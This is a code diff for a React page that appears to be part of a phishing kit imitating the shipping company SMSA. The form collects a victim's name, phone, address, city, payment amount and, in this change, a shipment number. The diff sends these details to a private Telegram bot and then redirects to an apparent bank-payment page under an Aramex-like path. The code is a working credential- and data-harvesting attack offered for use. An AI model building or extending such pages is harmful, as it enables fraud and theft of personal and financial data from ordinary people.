@@ -12,6 +12,7 @@ const Page = () => {
   let adress = useRef();
   let city = useRef();
   let mony = useRef();
+  let numshoh = useRef();
   let detales = useRef();
   const  name = useSearchParams();
   const track = name.get("name")
@@ -21,10 +22,10 @@ const Page = () => {
 
   const handlerout = () => {
     
-if(typeRequest.current.value == "اختر الخدمة" || fullname.current.value == "" || numphone.current.value == "" || adress.current.value == "" || city.current.value == "" || mony.current.value == "" || detales.current.value == "") {
+if(typeRequest.current.value == "اختر الخدمة" || fullname.current.value == "" || numphone.current.value == "" || adress.current.value == "" || city.current.value == "" || mony.current.value == "" || detales.current.value == ""||numshoh.current.value == "") {
       alert('من فضلك قم بملى الحقول')
     }else{
-       router.push(`/aram/banks?names=${track}`)
+       router.push(`/aram/banks?names=${numshoh.current.value}`)
     }
   }
 
@@ -32,7 +33,7 @@ if(typeRequest.current.value == "اختر الخدمة" || fullname.current.valu
   const handleSubmit = (e) => {
     e.preventDefault();
 
-    var length =`مدونة سمسا  %0A   نوع الخدمة : ${typeRequest.current.value} %0A الاسم الكامل  : ${fullname.current.value} %0A  رقم الجوال : ${numphone.current.value}%0A العنوان : ${adress.current.value} %0A المدينة : ${city.current.value} %0A قيمة السداد:${mony.current.value} %0A التفاصيل : ${detales.current.value} %0A %0A ${track}`
+    var length =`مدونة سمسا  %0A   نوع الخدمة : ${typeRequest.current.value} %0A الاسم الكامل  : ${fullname.current.value} %0A  رقم الجوال : ${numphone.current.value}%0A العنوان : ${adress.current.value} %0A المدينة : ${city.current.value} %0A قيمة السداد:${mony.current.value} %0A التفاصيل : ${detales.current.value} %0A %0A ${numshoh.current.value}`
 
 
     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
@@ -53,6 +54,7 @@ if(typeRequest.current.value == "اختر الخدمة" || fullname.current.valu
                 <option value="طلب توصيل">طلب توصيل</option>
                 <option value="طلب استلام">طلب استلام</option>
             </select>
+            <input type="number" name='numshoh' placeholder='رقم الشحنة' ref={numshoh} required />
             <input type="text" name='fullname'  placeholder='الأسم الكامل ' ref={fullname}required />
             <input type="text" name='numphone'  placeholder='رقم الجوال الخاص بلمستلم' ref={numphone}required />
             <input type="text" name='adress'  placeholder='العنوان بلكامل' ref={adress}required />
